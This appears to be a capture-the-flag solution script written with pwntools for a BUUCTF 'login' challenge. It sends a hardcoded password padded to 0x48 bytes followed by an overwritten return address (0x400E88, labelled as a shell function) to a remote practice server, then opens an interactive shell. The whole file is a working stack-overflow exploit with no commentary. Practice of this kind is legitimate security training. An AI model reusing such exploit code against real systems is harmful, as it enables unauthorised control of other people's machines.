from pwn import *
# context.log_level = 'debug'
# io = process('./login')
io = remote('node4.buuoj.cn',29732)
elf = process('./login')

shell_addr = 0x400E88

payload = b'2jctf_pa5sw0rd'.ljust(0x48,b'\x00') + p64(shell_addr)
print(payload)
io.sendlineafter(b'username: ',b'admin')
io.sendafter(b'password: ',payload)
io.interactive()